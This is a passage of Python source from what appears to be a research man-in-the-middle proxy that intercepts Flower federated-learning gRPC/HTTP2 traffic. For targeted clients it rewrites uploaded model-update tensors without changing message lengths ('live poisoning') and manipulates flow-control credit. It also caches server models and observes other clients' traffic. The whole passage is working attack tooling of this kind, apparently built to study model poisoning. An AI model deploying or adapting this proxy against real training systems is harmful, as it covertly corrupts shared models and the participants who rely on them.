                self.counters.arrays_found += int(arrays_found_message or 0)
                if int(details.get("tensor_count", 0) or 0) > 0:
                    self.counters.model_messages_found += 1
                if int(details.get("global_model_matched", 0) or 0) > 0:
                    self.counters.global_model_matches += 1
                if int(details.get("update_space_used", 0) or 0) > 0:
                    self.counters.update_space_messages += 1
            else:
                new_payload = payload
                reason = "client_not_targeted"
        elif not selected:
            self.counters.selected_messages_skipped += 1
            new_payload = payload
            reason = "outside_selected_message_range"
        else:
            rewrite_started = time.perf_counter()
            (
                new_payload,
                modified,
                reason,
                attack_details,
                arrays_found_message,
                arrays_modified_message,
            ) = process_update_space_upload(
                payload,
                client_ip=self.client_ip,
                message_index=self.message_index,
                stream_id=self.stream_id,
                args=self.args,
                rng=self.rng,
            )
            details.update(attack_details)
            details["rewrite_processing_duration_s"] = round(
                max(0.0, time.perf_counter() - rewrite_started), 6
            )
            self.counters.arrays_found += int(arrays_found_message or 0)
            self.counters.arrays_modified += int(arrays_modified_message or 0)
            if int(details.get("tensor_count", 0) or 0) > 0:
                self.counters.model_messages_found += 1
            if int(details.get("phase_gate_open", 0) or 0) > 0:
                self.counters.phase_gate_open_messages += 1
            elif int(details.get("phase_gate_enabled", 0) or 0) > 0:
                self.counters.phase_gate_blocked_messages += 1
            if int(details.get("global_model_matched", 0) or 0) > 0:
                self.counters.global_model_matches += 1
            if int(details.get("update_space_used", 0) or 0) > 0:
                self.counters.update_space_messages += 1
            if str(details.get("engine_decision", "")) == "warmup_observe_only":
                self.counters.warmup_observations += 1
            if modified:
                self.counters.grpc_messages_modified += 1
                if self.args.live_log_every > 0 and (
                    self.counters.grpc_messages_modified <= 5
                    or self.counters.grpc_messages_modified % self.args.live_log_every == 0
                ):
                    logger.info(
                        "[%s] UPDATE-SPACE message=%d round=%s tensors=%d "
                        "contract=%s genuine_norm=%s projected_norm=%s gate=%s mode=%s",
                        self.client_ip,
                        self.message_index,
                        details.get("fl_round", "?"),
                        details.get("tensor_count", 0),
                        str(details.get("model_contract_sha256", ""))[:12],
                        details.get("genuine_update_l2_norm", ""),
                        details.get("projected_update_l2_norm", ""),
                        details.get("phase_gate_reason", ""),
                        mode,
                    )

        if len(new_payload) != msg_len:
            logger.warning(
                "LIVE-POISON length change prevented at message=%d original=%d new=%d",
                self.message_index,
                msg_len,
                len(new_payload),
            )
            new_payload = payload
            modified = False
            reason = "length_change_reverted"
            arrays_modified_message = 0
            details["reconstruction_valid"] = 0

        details.setdefault("target_source", target_source)
        details.setdefault("poison_target_mode", str(getattr(self.args, "poison_target_mode", "static")))
        details.setdefault("active_analyzer_target", int(target_source == "analyzer_apply_poison_ttl"))
        if target_meta:
            details.setdefault(
                "analyzer_target_ttl_remaining_s",
                round(float(target_meta.get("ttl_remaining_s", 0.0)), 6),
            )
            details.setdefault("analyzer_target_round", target_meta.get("round", ""))
            details.setdefault("analyzer_target_source", target_meta.get("source", ""))
        if self.flow_bridge is not None:
            details.update(self.flow_bridge.snapshot())

        event_logger = _get_attack_event_logger()
        if event_logger is not None:
            try:
                event_logger.log_message(
                    client_ip=self.client_ip,
                    message_index=self.message_index,
                    stream_id=self.stream_id,
                    targeted=message_targeted,
                    selected_for_attack=selected,
                    modified=modified,
                    modification_reason=reason,
                    arrays_found_in_message=arrays_found_message,
                    arrays_modified_in_message=arrays_modified_message,
                    details=details,
                )
            except Exception as exc:
                logger.error("Could not write proxy attack-event row: %s", exc)

        self.message_index += 1
        return new_payload, modified

    def _start_large_message(self, prefix: bytes, compressed: int, msg_len: int) -> None:
        spool_dir = self.policy.spool_dir
        handle = tempfile.NamedTemporaryFile(
            mode="w+b",
            prefix=f"grpc_{self.client_ip.replace('.', '_')}_{self.stream_id}_",
            suffix=".bin",
            dir=spool_dir,
            delete=False,
        )
        self.large_state = LargeGrpcMessageState(
            prefix=prefix,
            compressed=int(compressed),
            msg_len=int(msg_len),
            path=Path(handle.name),
            handle=handle,
            received=0,
            policy_reason="adaptive_disk_spool",
        )

    def _feed_large_state(self, data: bytes) -> bytes:
        state = self.large_state
        if state is None:
            return data
        remaining = state.msg_len - state.received
        take = min(len(data), remaining)
        if take:
            state.handle.write(data[:take])
            state.received += take
        leftover = data[take:]
        if state.received >= state.msg_len:
            self._finish_large_message()
        return leftover

    def _finish_large_message(self) -> None:
        state = self.large_state
        if state is None:
            return
        state.handle.flush()
        try:
            os.fsync(state.handle.fileno())
        except Exception:
            pass
        state.handle.close()
        try:
            with state.path.open("r+b") as handle:
                mapped = mmap.mmap(handle.fileno(), 0, access=mmap.ACCESS_WRITE)
                try:
                    self._process_complete_payload(
                        mapped,
                        compressed=state.compressed,
                        msg_len=state.msg_len,
                        mode="disk_spool",
                    )
                    mapped.flush()
                finally:
                    mapped.close()
            self.output.append_bytes(state.prefix)
            self.output.append_file(state.path, state.msg_len, delete_on_close=True)
        except Exception:
            # Fail open: preserve the original spooled payload if processing fails.
            logger.exception(
                "[%s] large-message processing failed; relaying original spool",
                self.client_ip,
            )
            self.output.append_bytes(state.prefix)
            self.output.append_file(state.path, state.msg_len, delete_on_close=True)
        finally:
            self.large_state = None

    def _transform_available(self) -> None:
        while self.large_state is None and len(self.inbuf) >= 5:
            compressed = int(self.inbuf[0])
            msg_len = int.from_bytes(self.inbuf[1:5], "big")
            decision = self.policy.decide(msg_len)
            if not decision.allowed:
                logger.warning(
                    "[%s] gRPC declared length=%d rejected by adaptive policy: %s "
                    "hard_limit=%d available_disk=%d",
                    self.client_ip,
                    msg_len,
                    decision.reason,
                    decision.hard_limit_bytes,
                    decision.available_disk_bytes,
                )
                if self._resync_to_next_npy():
                    continue
                break

            total_len = 5 + msg_len
            if decision.buffer_mode == "disk_spool":
                prefix = bytes(self.inbuf[:5])
                del self.inbuf[:5]
                self._start_large_message(prefix, compressed, msg_len)
                available = min(len(self.inbuf), msg_len)
                chunk = bytes(self.inbuf[:available])
                del self.inbuf[:available]
                leftover = self._feed_large_state(chunk)
                if leftover:
                    self.inbuf[:0] = leftover
                if self.large_state is not None:
                    break
                continue

            if len(self.inbuf) < total_len:
                break
            prefix = bytes(self.inbuf[:5])
            payload = bytes(self.inbuf[5:total_len])
            del self.inbuf[:total_len]
            new_payload, _modified = self._process_complete_payload(
                payload,
                compressed=compressed,
                msg_len=msg_len,
                mode="memory",
            )
            self.output.append_bytes(prefix)
            self.output.append_bytes(bytes(new_payload))

    def _ingest(self, data: bytes) -> None:
        remaining = bytes(data)
        while remaining:
            if self.large_state is not None:
                remaining = self._feed_large_state(remaining)
                if self.large_state is not None:
                    return
                continue
            self.inbuf.extend(remaining)
            remaining = b""
            self._transform_available()

    def feed_data_payload(self, payload: bytes, flags: int, stream_id: int) -> List[bytes]:
        self.pending_frames.append(PendingDataFrame(len(payload), flags, stream_id))
        if (
            self.flow_bridge is not None
            and self.client_sock is not None
            and bool(getattr(self.args, "adaptive_flow_control", True))
        ):
            try:
                self.flow_bridge.grant(self.client_sock, int(stream_id), len(payload))
            except Exception as exc:
                logger.warning("[%s] synthetic flow-control credit failed: %s", self.client_ip, exc)
        self._ingest(payload)
        return self._drain_ready_frames()

    def _drain_ready_frames(self) -> List[bytes]:
        out_frames: List[bytes] = []
        while self.pending_frames and self.output.available >= self.pending_frames[0].payload_len:
            frame = self.pending_frames.pop(0)
            payload = self.output.read(frame.payload_len)
            out_frames.append(
                build_http2_frame_header(len(payload), 0, frame.flags, frame.stream_id) + payload
            )
        return out_frames

    def flush_raw_remaining(self) -> List[bytes]:
        out_frames = self._drain_ready_frames()
        if self.large_state is not None:
            state = self.large_state
            try:
                state.handle.flush()
                state.handle.close()
            except Exception:
                pass
            self.output.append_bytes(state.prefix)
            self.output.append_file(state.path, state.received, delete_on_close=True)
            self.large_state = None
        if self.inbuf:
            self.output.append_bytes(bytes(self.inbuf))
            self.inbuf.clear()

        while self.pending_frames:
            frame = self.pending_frames.pop(0)
            payload = self.output.read(frame.payload_len)
            if len(payload) < frame.payload_len:
                logger.warning(
                    "LIVE-POISON flushing incomplete DATA payload stream_id=%d expected=%d got=%d",
                    frame.stream_id,
                    frame.payload_len,
                    len(payload),
                )
            out_frames.append(
                build_http2_frame_header(len(payload), 0, frame.flags, frame.stream_id) + payload
            )
        self.output.close()
        return out_frames



class AsyncGrpcUploadObserver:
    """Observe non-target client uploads off the forwarding critical path.

    DATA frames are forwarded to the server first.  A lightweight reference to
    each payload is then queued for a daemon worker.  The worker reuses the
    architecture-neutral gRPC rewriter in observation-only mode, but it has no
    FlowControlBridge and no client socket, so it can never grant synthetic
    WINDOW_UPDATE credit or suppress real server credit.

    If observation falls behind, peer observation is disabled for that
    connection rather than delaying transport.  This preserves the experiment's
    primary invariant: non-target clients are transparent pass-through flows.
    """

    def __init__(
        self,
        args: argparse.Namespace,
        counters: LivePoisonCounters,
        rng,
        client_ip: str,
        max_queue_frames: int = 1024,
    ) -> None:
        self.args = args
        self.counters = counters
        self.rng = rng
        self.client_ip = str(client_ip)
        self.max_queue_frames = max(16, int(max_queue_frames))
        self._queue: "queue.Queue[object]" = queue.Queue(maxsize=self.max_queue_frames)
        self._rewriters: Dict[int, GrpcStreamRewriter] = {}
        self._closed = threading.Event()
        self._disabled = False
        self.frames_offered = 0
        self.bytes_offered = 0
        self.frames_dropped = 0
        self.worker_errors = 0
        self._thread = threading.Thread(
            target=self._run,
            daemon=True,
            name=f"peer-observe-up-{self.client_ip}",
        )
        self._thread.start()

    def offer(self, stream_id: int, flags: int, payload: bytes) -> bool:
        if self._closed.is_set() or self._disabled:
            return False
        try:
            self._queue.put_nowait((int(stream_id), int(flags), payload))
            self.frames_offered += 1
            self.bytes_offered += len(payload)
            return True
        except queue.Full:
            self.frames_dropped += 1
            self._disabled = True
            logger.warning(
                "[%s] non-target peer observation queue saturated after %d frames/%d bytes; "
                "observation disabled for this connection while transparent forwarding continues",
                self.client_ip,
                self.frames_offered,
                self.bytes_offered,
            )
            return False

    def _run(self) -> None:
        while not self._closed.is_set():
            try:
                item = self._queue.get(timeout=0.25)
            except queue.Empty:
                continue
            if item is None:
                self._queue.task_done()
                break
            stream_id, flags, payload = item
            try:
                rewriter = self._rewriters.get(stream_id)
                if rewriter is None:
                    rewriter = GrpcStreamRewriter(
                        self.args,
                        self.counters,
                        self.rng,
                        client_ip=self.client_ip,
                        stream_id=stream_id,
                        flow_bridge=None,
                        client_sock=None,
                    )
                    self._rewriters[stream_id] = rewriter
                # Observation-only: output frames are deliberately discarded.
                rewriter.feed_data_payload(payload, flags, stream_id)
            except Exception as exc:
                self.worker_errors += 1
                logger.warning(
                    "[%s] asynchronous non-target upload observation failed: %s: %s",
                    self.client_ip,
                    type(exc).__name__,
                    exc,
                )
            finally:
                self._queue.task_done()

        for rewriter in list(self._rewriters.values()):
            try:
                rewriter.flush_raw_remaining()
            except Exception:
                pass

    def close(self, wait_timeout_s: float = 0.5) -> None:
        if self._closed.is_set():
            return
        self._closed.set()
        try:
            self._queue.put_nowait(None)
        except queue.Full:
            pass
        self._thread.join(timeout=max(0.0, float(wait_timeout_s)))

    def snapshot(self) -> dict:
        return {
            "peer_observation_async": 1,
            "peer_observation_queue_max_frames": self.max_queue_frames,
            "peer_observation_frames_offered": self.frames_offered,
            "peer_observation_bytes_offered": self.bytes_offered,
            "peer_observation_frames_dropped": self.frames_dropped,
            "peer_observation_worker_errors": self.worker_errors,
            "peer_observation_disabled": int(self._disabled),
            "peer_observation_queue_depth": self._queue.qsize(),
        }


class GrpcDownloadObserver:
    """Architecture-neutral server-to-client gRPC model observer.

    Forwarding is immediate in the relay thread. Observation uses memory for
    small messages and a temporary disk spool for large messages, avoiding an
    architecture-specific size assumption.
    """

    def __init__(self, args: argparse.Namespace, client_ip: str, stream_id: int):
        self.args = args
        self.client_ip = str(client_ip)
        self.stream_id = int(stream_id)
        self.policy = get_message_policy(args)
        self.inbuf = bytearray()
        self.large_state: Optional[LargeGrpcMessageState] = None
        self.message_index = 0

    def _resync(self) -> bool:
        position = self.inbuf.find(NPY_MAGIC, 1)
        if position < 0:
            if self.inbuf:
                del self.inbuf[:1]
            return False
        prefix_start = max(0, position - 5)
        if prefix_start > 0:
            del self.inbuf[:prefix_start]
        return True

    def _observe_complete_payload(self, payload, compressed: int, msg_len: int, mode: str) -> None:
        if compressed == 0:
            block, _specs, arrays_found = extract_float_model_block(payload, self.args)
            if block:
                try:
                    contract = contract_summary_fields(block)
                    entry = get_model_cache(self.args).store(
                        self.client_ip,
                        block,
                        message_index=self.message_index,
                        stream_id=self.stream_id,
                    )
                    state = _get_dashboard_state()
                    if state is not None:
                        state.add_event(
                            "CACHE",
                            (
                                f"cached global model client={self.client_ip} "
                                f"round={entry.round_value or '?'} tensors={len(block)} "
                                f"bytes={contract['model_contract_total_bytes']} "
                                f"contract={contract['model_contract_sha256'][:12]} "
                                f"buffer={mode} qualified={int(entry.phase_qualified)}"
                            ),
                        )
                except Exception as exc:
                    logger.warning("[%s] could not cache server model: %s", self.client_ip, exc)
            elif arrays_found:
                logger.debug(
                    "[%s] server message=%d contained %d arrays but not a complete model block",
                    self.client_ip,
                    self.message_index,
                    arrays_found,
                )
        self.message_index += 1

    def _start_large_message(self, prefix: bytes, compressed: int, msg_len: int) -> None:
        handle = tempfile.NamedTemporaryFile(
            mode="w+b",
            prefix=f"download_{self.client_ip.replace('.', '_')}_{self.stream_id}_",
            suffix=".bin",
            dir=self.policy.spool_dir,
            delete=False,
        )
        self.large_state = LargeGrpcMessageState(
            prefix=prefix,
            compressed=int(compressed),
            msg_len=int(msg_len),
            path=Path(handle.name),
            handle=handle,
            received=0,
            policy_reason="adaptive_disk_spool",
        )

    def _feed_large_state(self, data: bytes) -> bytes:
        state = self.large_state
        if state is None:
            return data
        remaining = state.msg_len - state.received
        take = min(len(data), remaining)
        if take:
            state.handle.write(data[:take])
            state.received += take
        leftover = data[take:]
        if state.received >= state.msg_len:
            self._finish_large_message()
        return leftover

    def _finish_large_message(self) -> None:
        state = self.large_state
        if state is None:
            return
        state.handle.flush()
        try:
            os.fsync(state.handle.fileno())
        except Exception:
            pass
        state.handle.close()
        try:
            with state.path.open("rb") as handle:
                mapped = mmap.mmap(handle.fileno(), 0, access=mmap.ACCESS_READ)
                try:
                    self._observe_complete_payload(
                        mapped,
                        state.compressed,
                        state.msg_len,
                        "disk_spool",
                    )
                finally:
                    mapped.close()
        finally:
            try:
                state.path.unlink(missing_ok=True)
            except Exception:
                pass
            self.large_state = None

    def _transform_available(self) -> None:
        while self.large_state is None and len(self.inbuf) >= 5:
            compressed = int(self.inbuf[0])
            msg_len = int.from_bytes(self.inbuf[1:5], "big")
            decision = self.policy.decide(msg_len)
            if not decision.allowed:
                logger.warning(
                    "[%s] server gRPC declared length=%d rejected by adaptive policy: %s",
                    self.client_ip,
                    msg_len,
                    decision.reason,
                )
                if self._resync():
                    continue
                break
            total = 5 + msg_len
            if decision.buffer_mode == "disk_spool":
                prefix = bytes(self.inbuf[:5])
                del self.inbuf[:5]
                self._start_large_message(prefix, compressed, msg_len)
                available = min(len(self.inbuf), msg_len)
                chunk = bytes(self.inbuf[:available])
                del self.inbuf[:available]
                leftover = self._feed_large_state(chunk)
                if leftover:
                    self.inbuf[:0] = leftover
                if self.large_state is not None:
                    break
                continue
            if len(self.inbuf) < total:
                break
            payload = bytes(self.inbuf[5:total])
            del self.inbuf[:total]
            self._observe_complete_payload(payload, compressed, msg_len, "memory")

    def feed(self, data_payload: bytes) -> None:
        remaining = bytes(data_payload)
        while remaining:
            if self.large_state is not None:
                remaining = self._feed_large_state(remaining)
                if self.large_state is not None:
                    return
                continue
            self.inbuf.extend(remaining)
            remaining = b""
            self._transform_available()

    def close(self) -> None:
        if self.large_state is not None:
            state = self.large_state
            try:
                state.handle.close()
            except Exception:
                pass
            try:
                state.path.unlink(missing_ok=True)
            except Exception:
                pass
            self.large_state = None



class AsyncGrpcDownloadObserver:
    """Observe non-target server downloads asynchronously after forwarding.

    The relay always sends the HTTP/2 frame to the client before enqueueing the
    DATA payload for model-cache observation.  Queue saturation disables only
    observation; it never delays or alters the non-target connection.
    """

    def __init__(self, args: argparse.Namespace, client_ip: str, max_queue_frames: int = 1024) -> None:
        self.args = args
        self.client_ip = str(client_ip)
        self.max_queue_frames = max(16, int(max_queue_frames))
        self._queue: "queue.Queue[object]" = queue.Queue(maxsize=self.max_queue_frames)
        self._observers: Dict[int, GrpcDownloadObserver] = {}
        self._closed = threading.Event()
        self._disabled = False
        self.frames_offered = 0
        self.bytes_offered = 0
        self.frames_dropped = 0
        self.worker_errors = 0
        self._thread = threading.Thread(
            target=self._run,
            daemon=True,
            name=f"model-observe-down-{self.client_ip}",
        )
        self._thread.start()

    def offer(self, stream_id: int, payload: bytes) -> bool:
        if self._closed.is_set() or self._disabled:
            return False
        try:
            self._queue.put_nowait((int(stream_id), payload))
            self.frames_offered += 1
            self.bytes_offered += len(payload)
            return True
        except queue.Full:
            self.frames_dropped += 1
            self._disabled = True
            logger.warning(
                "[%s] non-target download observation queue saturated after %d frames/%d bytes; "
                "observation disabled while transparent forwarding continues",
                self.client_ip,
                self.frames_offered,
                self.bytes_offered,
            )
            return False

    def _run(self) -> None:
        while not self._closed.is_set():
            try:
                item = self._queue.get(timeout=0.25)
            except queue.Empty:
                continue
            if item is None:
                self._queue.task_done()
                break
            stream_id, payload = item
            try:
                observer = self._observers.get(stream_id)
                if observer is None:
                    observer = GrpcDownloadObserver(
                        self.args,
                        client_ip=self.client_ip,
                        stream_id=stream_id,
                    )
                    self._observers[stream_id] = observer
                observer.feed(payload)
            except Exception as exc:
                self.worker_errors += 1
                logger.warning(
                    "[%s] asynchronous non-target download observation failed: %s: %s",
                    self.client_ip,
                    type(exc).__name__,
                    exc,
                )
            finally:
                self._queue.task_done()

        for observer in list(self._observers.values()):
            try:
                observer.close()
            except Exception:
                pass

    def close(self, wait_timeout_s: float = 0.5) -> None:
        if self._closed.is_set():
            return
        self._closed.set()
        try:
            self._queue.put_nowait(None)
        except queue.Full:
            pass
        self._thread.join(timeout=max(0.0, float(wait_timeout_s)))

    def snapshot(self) -> dict:
        return {
            "download_observation_async": 1,
            "download_observation_queue_max_frames": self.max_queue_frames,
            "download_observation_frames_offered": self.frames_offered,
            "download_observation_bytes_offered": self.bytes_offered,
            "download_observation_frames_dropped": self.frames_dropped,
            "download_observation_worker_errors": self.worker_errors,
            "download_observation_disabled": int(self._disabled),
            "download_observation_queue_depth": self._queue.qsize(),
        }


def send_capture_count(
    dst: socket.socket,
    data: bytes,
    capture: Optional[StreamCapture],
    capture_handle: Optional[object],
    written: int,
    stats: Optional[ConnectionStats],
    label: str,
) -> Tuple[int, int]:
    if not data:
        return written, 0
    if capture:
        written = capture.write(capture_handle, data, written)
    dst.sendall(data)
    if stats:
        stats.add(label, len(data))
    return written, len(data)


def relay_http2_poison_client_to_server(
    src: socket.socket,
    dst: socket.socket,
    client_ip: str,
    first_bytes: bytes,
    capture: Optional[StreamCapture] = None,
    capture_handle: Optional[object] = None,
    stats: Optional[ConnectionStats] = None,
    args: Optional[argparse.Namespace] = None,
    flow_bridge: Optional[FlowControlBridge] = None,
) -> None:
    label = "client->server"
    written = 0
    direction_bytes = 0
    direction_chunks = 0
    counters = LivePoisonCounters()
    state = _get_dashboard_state()
    if state is not None and stats is not None:
        state.attach_counters(stats, counters)
    rng = np.random.default_rng(args.live_seed) if np is not None else None
    rewriters: Dict[int, GrpcStreamRewriter] = {}
    termination_reason = "peer_eof"
    termination_exception = ""
    try:
        if first_bytes == HTTP2_CLIENT_PREFACE[:4]:
            rest = recv_exact(src, len(HTTP2_CLIENT_PREFACE) - 4)
            if not rest:
                return
            preface = first_bytes + rest
            if preface != HTTP2_CLIENT_PREFACE:
                logger.warning("[%s] unexpected HTTP/2 preface; falling back to raw relay", client_ip)
                relay_stream(src, dst, client_ip, label, preface, capture, capture_handle, stats)
                return
            written, n = send_capture_count(dst, preface, capture, capture_handle, written, stats, label)
            direction_bytes += n
            direction_chunks += 1
        else:
            # Non-HTTP2 stream. Relay raw.
            logger.info("[%s] no HTTP/2 preface; raw relay", client_ip)
            relay_stream(src, dst, client_ip, label, first_bytes, capture, capture_handle, stats)
            return

        logger.warning(
            "[%s] Flower/gRPC HTTP2 detected. PHASE-GATED UPDATE-SPACE poisoning enabled direction=client->server attack=%s alpha=%.4f start_msg=%d end_msg=%d",
            client_ip, args.live_attack, args.live_alpha, args.live_start_message, args.live_end_message,
        )

        while True:
            item = read_http2_frame(src)
            if item is None:
                break
            hdr, frame_type, flags, stream_id, payload = item
            # DATA frame only. If PADDED flag is set, keep it raw to avoid padding mistakes.
            if frame_type == 0 and stream_id != 0 and not (flags & 0x8):
                rw = rewriters.setdefault(
                    stream_id,
                    GrpcStreamRewriter(
                        args, counters, rng, client_ip=client_ip, stream_id=stream_id,
                        flow_bridge=flow_bridge, client_sock=src,
                    ),
                )
                out_frames = rw.feed_data_payload(payload, flags, stream_id)
                for frame_bytes in out_frames:
                    written, n = send_capture_count(dst, frame_bytes, capture, capture_handle, written, stats, label)
                    direction_bytes += n
                    direction_chunks += 1
            else:
                frame_bytes = hdr + payload
                written, n = send_capture_count(dst, frame_bytes, capture, capture_handle, written, stats, label)
                direction_bytes += n
                direction_chunks += 1

        # Flush any completed or residual data on close.
        for stream_id, rw in list(rewriters.items()):
            for frame_bytes in rw.flush_raw_remaining():
                written, n = send_capture_count(dst, frame_bytes, capture, capture_handle, written, stats, label)
                direction_bytes += n
                direction_chunks += 1
    except Exception as exc:
        termination_reason = f"exception:{type(exc).__name__}"
        termination_exception = repr(exc)
        logger.warning(
            "[%s] TARGET client->server HTTP/2 relay terminated by %s: %r",
            client_ip,
            type(exc).__name__,
            exc,
        )
    finally:
        if stats:
            stats.mark_closed(label)
        flow_snapshot = flow_bridge.snapshot() if flow_bridge is not None else {}
        logger.info(
            "[%s] TARGET h2 update-space relay closed reason=%s exception=%s "
            "bytes=%d chunks=%d captured_bytes=%d grpc_seen=%d grpc_modified=%d "
            "arrays_found=%d arrays_modified=%d compressed_skipped=%d parse_errors=%d "
            "model_messages=%d gate_open=%d global_matches=%d update_space=%d "
            "synthetic_conn_outstanding=%s synthetic_stream_outstanding=%s "
            "credit_granted=%s credit_suppressed=%s",
            client_ip,
            termination_reason,
            termination_exception,
            direction_bytes,
            direction_chunks,
            written,
            counters.grpc_messages_seen,
            counters.grpc_messages_modified,
            counters.arrays_found,
            counters.arrays_modified,
            counters.compressed_messages_skipped,
            counters.parse_errors,
            counters.model_messages_found,
            counters.phase_gate_open_messages,
            counters.global_model_matches,
            counters.update_space_messages,
            flow_snapshot.get("synthetic_connection_credit_outstanding", 0),
            flow_snapshot.get("synthetic_stream_credit_outstanding", {}),
            flow_snapshot.get("flow_control_synthetic_credit_bytes", 0),
            flow_snapshot.get("flow_control_server_credit_suppressed_bytes", 0),
        )
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass
        if capture:
            capture.close(capture_handle)


def relay_http2_transparent_observe_client_to_server(
    src: socket.socket,
    dst: socket.socket,
    client_ip: str,
    first_bytes: bytes,
    capture: Optional[StreamCapture] = None,
    capture_handle: Optional[object] = None,
    stats: Optional[ConnectionStats] = None,
    args: Optional[argparse.Namespace] = None,
) -> None:
    """Transparent non-target HTTP/2 upload relay with passive async observation.

    No DATA frame is withheld, rewritten, or flow-controlled by the proxy.  The
    frame is forwarded first; only then is its payload offered to a bounded
    asynchronous observer for peer fingerprinting.
    """
    label = "client->server"
    written = 0
    direction_bytes = 0
    direction_chunks = 0
    counters = LivePoisonCounters()
    rng = np.random.default_rng(args.live_seed) if np is not None else None
    queue_frames = int(getattr(args, "non_target_observation_queue_frames", 1024) or 1024)
    observer = AsyncGrpcUploadObserver(
        args,
        counters,
        rng,
        client_ip,
        max_queue_frames=queue_frames,
    )
    termination_reason = "peer_eof"
    termination_exception = ""
    try:
        if first_bytes == HTTP2_CLIENT_PREFACE[:4]:
            rest = recv_exact(src, len(HTTP2_CLIENT_PREFACE) - 4)
            if not rest:
                termination_reason = "incomplete_http2_preface"
                return
            preface = first_bytes + rest
            if preface != HTTP2_CLIENT_PREFACE:
                termination_reason = "unexpected_http2_preface_fallback_raw"
                logger.warning(
                    "[%s] non-target connection had unexpected HTTP/2 preface; falling back to raw relay",
                    client_ip,
                )
                relay_stream(src, dst, client_ip, label, preface, capture, capture_handle, stats)
                return
            written, n = send_capture_count(
                dst, preface, capture, capture_handle, written, stats, label
            )
            direction_bytes += n
            direction_chunks += 1
        else:
            termination_reason = "non_http2_fallback_raw"
            relay_stream(src, dst, client_ip, label, first_bytes, capture, capture_handle, stats)
            return

        logger.info(
            "[%s] NON-TARGET transparent HTTP/2 upload relay active: "
            "no rewriter, no pending DATA, no synthetic WINDOW_UPDATE, no server-credit suppression",
            client_ip,
        )

        while True:
            item = read_http2_frame(src)
            if item is None:
                termination_reason = "peer_eof"
                break
            hdr, frame_type, flags, stream_id, payload = item
            frame_bytes = hdr + payload

            # Critical invariant: forward first, observe second.
            written, n = send_capture_count(
                dst, frame_bytes, capture, capture_handle, written, stats, label
            )
            direction_bytes += n
            direction_chunks += 1

            if frame_type == 0 and stream_id != 0 and not (flags & 0x8):
                observer.offer(stream_id, flags, payload)
    except Exception as exc:
        termination_reason = f"exception:{type(exc).__name__}"
        termination_exception = repr(exc)
        logger.warning(
            "[%s] NON-TARGET transparent client->server relay terminated by %s: %r",
            client_ip,
            type(exc).__name__,
            exc,
        )
    finally:
        observer.close()
        if stats:
            stats.mark_closed(label)
        obs = observer.snapshot()
        logger.info(
            "[%s] NON-TARGET transparent client->server relay closed reason=%s exception=%s "
            "bytes=%d chunks=%d captured_bytes=%d observer_frames=%d observer_bytes=%d "
            "observer_dropped=%d observer_errors=%d observer_disabled=%d "
            "synthetic_credit=0 server_credit_suppressed=0",
            client_ip,
            termination_reason,
            termination_exception,
            direction_bytes,
            direction_chunks,
            written,
            obs["peer_observation_frames_offered"],
            obs["peer_observation_bytes_offered"],
            obs["peer_observation_frames_dropped"],
            obs["peer_observation_worker_errors"],
            obs["peer_observation_disabled"],
        )
        try:
            dst.shutdown(socket.SHUT_WR)
        except Exception:
            pass
        if capture:
            capture.close(capture_handle)


def relay_http2_transparent_observe_server_to_client(
    src: socket.socket,
    dst: socket.socket,
    client_ip: str,
    capture: Optional[StreamCapture] = None,
    capture_handle: Optional[object] = None,
    stats: Optional[ConnectionStats] = None,
    args: Optional[argparse.Namespace] = None,
) -> None:
    """Transparent non-target HTTP/2 download relay with async model observation."""
    label = "server->client"
    written = 0
    direction_bytes = 0
    direction_chunks = 0
    queue_frames = int(getattr(args, "non_target_observation_queue_frames", 1024) or 1024)
    observer = AsyncGrpcDownloadObserver(
        args,
        client_ip,
        max_queue_frames=queue_frames,
    )
    termination_reason = "peer_eof"
    termination_exception = ""
    try:
        logger.info(
            "[%s] NON-TARGET transparent HTTP/2 download relay active: "
            "no WINDOW_UPDATE suppression; frame forwarded before observation",
            client_ip,
        )
        while True:
            item = read_http2_frame(src)
            if item is None:
                termination_reason = "peer_eof"
                break
            header, frame_type, flags, stream_id, payload = item
            frame_bytes = header + payload

            # Critical invariant: forward the exact server frame first.
            written, count = send_capture_count(
                dst, frame_bytes, capture, capture_handle, written, stats, label
            )
            direction_bytes += count
            direction_chunks += 1

            if frame_type == 0 and stream_id != 0:
                data_payload = payload
                if flags & 0x8:  # PADDED
                    if not payload:
                        continue
                    padding = int(payload[0])
                    if padding > len(payload) - 1:
                        continue
                    data_payload = payload[1 : len(payload) - padding if padding else len(payload)]
                observer.offer(stream_id, data_payload)
    except Exception as exc:
        termination_reason = f"exception:{type(exc).__name__}"
        termination_exception = repr(exc)
        logger.warning(
            "[%s] NON-TARGET transparent server->client relay terminated by %s: %r",
            client_ip,
            type(exc).__name__,
            exc,
        )
    finally:
        observer.close()
        if stats:
            stats.mark_closed(label)
        obs = observer.snapshot()
        cache_entries = (
            len(get_model_cache(args).entries.get(str(client_ip), []))
            if args is not None else 0
        )
        logger.info(
            "[%s] NON-TARGET transparent server->client relay closed reason=%s exception=%s "
            "bytes=%d chunks=%d captured_bytes=%d cache_entries=%d "
            "observer_frames=%d observer_bytes=%d observer_dropped=%d observer_errors=%d "
            "observer_disabled=%d synthetic_credit=0 server_credit_suppressed=0",
            client_ip,
            termination_reason,
            termination_exception,
            direction_bytes,
            direction_chunks,
            written,
            cache_entries,
            obs["download_observation_frames_offered"],
            obs["download_observation_bytes_offered"],
            obs["download_observation_frames_dropped"],
            obs["download_observation_worker_errors"],
            obs["download_observation_disabled"],
        )


def read_first_len_or_raw(client_sock: socket.socket, max_message_bytes: int) -> Tuple[str, bytes, int]:
    first4 = recv_exact(client_sock, 4)
    if not first4:
        return "closed", b"", 0
    # HTTP/2 has an explicit connection preface. Detect it before interpreting
    # the first four bytes as a custom pickle length; with multi-GiB adaptive
    # safety limits, every 32-bit integer would otherwise appear plausible.
    if first4 == HTTP2_CLIENT_PREFACE[:4]:
        return "raw", first4, 0
    msg_len = struct.unpack("!I", first4)[0]
    if msg_len <= 0 or msg_len > max_message_bytes:
        return "raw", first4, msg_len
    return "pickle", first4, msg_len



def relay_http2_observe_server_to_client(
    src: socket.socket,
    dst: socket.socket,
    client_ip: str,
    capture: Optional[StreamCapture] = None,
    capture_handle: Optional[object] = None,
    stats: Optional[ConnectionStats] = None,
    args: Optional[argparse.Namespace] = None,
    flow_bridge: Optional[FlowControlBridge] = None,
) -> None:
    """Forward server HTTP/2 frames immediately while observing model downloads."""
    label = "server->client"
    written = 0
    direction_bytes = 0
    direction_chunks = 0
    observers: Dict[int, GrpcDownloadObserver] = {}
    termination_reason = "peer_eof"
    termination_exception = ""
    try:
        while True:
            item = read_http2_frame(src)
            if item is None:
                break
